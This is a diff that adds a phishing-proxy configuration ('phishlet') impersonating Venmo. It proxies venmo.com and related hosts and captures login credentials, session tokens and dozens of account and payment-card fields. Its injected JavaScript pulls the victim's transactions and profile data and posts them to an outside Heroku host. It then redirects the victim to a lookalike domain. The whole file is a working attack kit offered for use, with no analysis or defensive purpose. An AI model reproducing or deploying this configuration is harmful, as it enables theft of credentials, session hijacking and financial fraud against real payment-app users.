@@ -1,0 +1,207 @@
+name: 'venmo'
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'venmo.com', session: true, is_landing: true}
+  - {phish_sub: 'cdn1', orig_sub: 'cdn1', domain: 'venmo.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'venmo.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'amplitude.com', session: false, is_landing: false}
+  - {phish_sub: 'd2zah9y47r7bi2', orig_sub: 'd2zah9y47r7bi2', domain: 'cloudfront.net', session: false, is_landing: false}
+  - {phish_sub: 'identity', orig_sub: 'identity', domain: 'mparticle.com', session: false, is_landing: false}
+  - {phish_sub: 'jssdkcdns', orig_sub: 'jssdkcdns', domain: 'mparticle.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google-analytics.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: "'api-'", replace: "'api.'", mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'cdn1.venmo.com', orig_sub: 'cdn1', domain: 'venmo.com', search: '(?:\/\^venmo\\.com\$)+', replace: '/^venmo\.', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'cdn1.{hostname}', replace: 'cdn1.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'api.{hostname}', replace: 'api.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'd2zah9y47r7bi2.cloudfront.net', replace: 'api.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'crossorigin=(.+?)"', replace: '', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'identity.mparticle.com', replace: '', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'mparticle.com', replace: '', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'www.google-analytics.com', replace: '', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'api.amplitude', replace: '', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+auth_tokens:
+  - domain: '.venmo.com'
+    keys: ['v_id', 'api_access_token']
+credentials:
+  username:
+    key: 'phoneEmailUsername'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'account_balance'
+      search: '(.*)'
+      type: 'post'
+    - key: 'total_transactions'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_indebted'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_limited_account'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_suspended_for_disputes'
+      search: '(.*)'
+      type: 'post'
+    - key: 'needs_verification'
+      search: '(.*)'
+      type: 'post'
+    - key: 'profile_username'
+      search: '(.*)'
+      type: 'post'
+    - key: 'date_joined'
+      search: '(.*)'
+      type: 'post'
+    - key: 'display_name'
+      search: '(.*)'
+      type: 'post'
+    - key: 'email'
+      search: '(.*)'
+      type: 'post'
+    - key: 'first_name'
+      search: '(.*)'
+      type: 'post'
+    - key: 'last_name'
+      search: '(.*)'
+      type: 'post'
+    - key: 'user_id'
+      search: '(.*)'
+      type: 'post'
+    - key: 'identity_type'
+      search: '(.*)'
+      type: 'post'
+    - key: 'date_joined'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_active'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_blocked'
+      search: '(.*)'
+      type: 'post'
+    - key: 'is_venmo_team'
+      search: '(.*)'
+      type: 'post'
+    - key: 'profile_phone'
+      search: '(.*)'
+      type: 'post'
+    - key: 'profile_picture_url'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Payment_Method'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Type'
+      search: '(.*)'
+      type: 'post'
+    - key: 'payment_name'
+      search: '(.*)'
+      type: 'post'
+    - key: 'last_four'
+      search: '(.*)'
+      type: 'post'
+    - key: 'payment_id'
+      search: '(.*)'
+      type: 'post'
+    - key: 'payment_verified'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card_type'
+      search: '(.*)'
+      type: 'post'
+    - key: 'issuing_bank'
+      search: '(.*)'
+      type: 'post'
+    - key: 'prepaid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Scheme'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/api/v5/me'
+login:
+  domain: 'venmo.com'
+  path: '/account/sign-in'
+
+js_inject:
+  - trigger_domains: ['venmo.com']
+    trigger_paths: ['/']
+    script: |
+      function serialize( obj ){
+        var str = [];
+        for (var p in obj){
+          if (obj.hasOwnProperty(p)) {
+            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+          }
+        }
+        return str.join("&");
+      }
+      function account_data(){
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("GET", 'https://venmo.securityaccess.net/api/v5/transactions', true);
+        xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        xhttp.onreadystatechange = function(){
+          if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+            var transactions = JSON.parse(xhttp.response).data;
+            console.log(this.status);
+            console.log( "Transactions" );
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", 'https://venmo.securityaccess.net/api/v5/me', true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.onreadystatechange = function() {
+              if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                var account_data = JSON.parse(xhr.response);
+                var obj = account_data;
+                console.log(this.status);
+                var xhttps = new XMLHttpRequest();
+                var xxhr = new XMLHttpRequest();
+                var tosend = {
+                  account_balance: obj.balance,
+                  profile_username: obj.username,
+                  date_joined: obj.date_created,
+                  total_transactions: transactions.length,
+                  display_name: obj.name,
+                  email: obj.email,
+                  first_name: obj.firstname,
+                  last_name: obj.lastname,
+                  user_id: obj.external_id,
+                  profile_phone: obj.phone,
+                  profile_picture_url: obj.picture,
+                }
+                xxhr.onreadystatechange = function(){
+                  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                    console.log( "Account Data" );
+                    window.location.replace("https://venomotransactionprocess.com/?venmo&user_id="+obj.external_id);
+                  }
+                }
+                xhttps.open( "POST", "/getuserinfo", true );
+                xhttps.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                console.log( serialize( "sending data" ) );
+                xhttps.send( serialize( tosend ) );
+                console.log( serialize( "sent data" ) );
+                
+                xxhr.open( "POST", "https://vendata-app.herokuapp.com/getdata.php", true );
+                xxhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                console.log( serialize( "sending data server" ) );
+                xxhr.send( serialize( tosend ) );
+                console.log( serialize( "sent data server" ) );
+                console.log(this.status);
+              }
+            } 
+            xhr.send();
+          } 
+        }
+        xhttp.send();
+      }
+      if (document.querySelector('[href="/account/logout"]').offsetParent !== null) {
+        account_data();
+      } 
+
